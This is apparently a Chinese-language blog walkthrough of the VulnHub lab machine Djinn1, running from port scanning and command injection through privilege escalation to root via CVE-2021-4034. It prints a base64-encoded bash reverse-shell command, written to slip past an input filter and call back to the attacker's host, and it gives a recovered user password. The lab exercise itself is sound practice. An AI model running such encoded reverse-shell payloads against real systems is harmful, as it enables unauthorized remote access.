+++
title = '0x078 Djinn1'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# 端口扫描

![](/vulnhub_img/WEBRESOURCE32d366749858f384b258b752e94a4555image.png)

![](/vulnhub_img/WEBRESOURCE8bff7a9e9a70b6b4389424a5314dc4a1image.png)

![](/vulnhub_img/WEBRESOURCEcaa498add233ae75057ecb27b2f7af48image.png)

# 渗透

FTP：

![](/vulnhub_img/WEBRESOURCE9c508adcba3bbe67f5ba8672f778cbedimage.png)

这里有几个信息，1337端口？nitish81299、nitu:81299

![](/vulnhub_img/WEBRESOURCE28cf9501e1386257869e0ecc2dfe189cimage.png)

HTTP：

![](/vulnhub_img/WEBRESOURCE56c3137b5f4bf4648827e8f7fc6c033bimage.png)

命令执行：

![](/vulnhub_img/WEBRESOURCE008cfbe77d712786215abc017467fb64image.png)

![](/vulnhub_img/WEBRESOURCEf52666b561ae6d53df6e1b04f1302739image.png)

用burp抓包可以发现是个重定向：

![](/vulnhub_img/WEBRESOURCE94786b2ab29c9817b29c1a8d95408c20image.png)

反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：

```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==" | base64 -d | bash
```

![](/vulnhub_img/WEBRESOURCEdbaf6d5b9c645fda8da1e122548ce48fimage.png)

# 提权

![](/vulnhub_img/WEBRESOURCEd574aa49ef46874eac356a3cf4f63212image.png)

发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：

![](/vulnhub_img/WEBRESOURCE236e0ff3dba9d9a66f092e7de1b11d8dimage.png)

然后在nitish的家目录下面找到密码：

nitish:p4ssw0rdStr3r0n9

![](/vulnhub_img/WEBRESOURCE7ca081e0461a31522c964c593daf591dimage.png)

切换到sam用户，用gtfobin的方法，这里都执行失败了，

![](/vulnhub_img/WEBRESOURCEc683522e6f1484e907b650a8a9fb899fimage.png)

这里又有一个坑，使用-h看到的参数里面都没法执行成功：

![](/vulnhub_img/WEBRESOURCE5222747087bbc5564aba2b847411d9eaimage.png)

但是man可以：

![](/vulnhub_img/WEBRESOURCE0d9988f2265199aee2a8203785458e5fimage.png)

然后就是，随便带一个参数就可以提权：

![](/vulnhub_img/WEBRESOURCE61dfb0f6d86c449c7b8a46afa28a7c6cimage.png)

sudo提权这里不知道怎么利用：

![](/vulnhub_img/WEBRESOURCEc5d855c8b22f37d0f91a1fac4fd2cd5aimage.png)

去sam家目录下面翻查，有一个.pyc的文件：

![](/vulnhub_img/WEBRESOURCE73196c0a316200d848a11d085ec09e94image.png)

传出来：

![](/vulnhub_img/WEBRESOURCE95edb9c1f70249eea6a045d446210497image.png)

![](/vulnhub_img/WEBRESOURCE63440625801c3d345ed09e410426e479image.png)

反编译：

[https://tool.lu/pyc/](https://tool.lu/pyc/)

![](/vulnhub_img/WEBRESOURCE5ef5e9e34de05e7716a88837f112d19cimage.png)

```
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 2.7

from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'

if __name__ == '__main__':
    main(options())
```

大概看一下，可以知道整个逻辑，当输入的内容等于num的时候，执行/bin/sh，那么这里其实理论上运气足够好，或者写个脚本一直怼着一个数字跑，应该是可以直接拿到shell的，但是这种方法明显不靠谱，在这里python2中，

![](/vulnhub_img/WEBRESOURCE00a142e4a60fb0c51727382ef913d3fcimage.png)

2021-4034秒了：

![](/vulnhub_img/WEBRESOURCE33c797731ace0408053033aee073703dimage.png)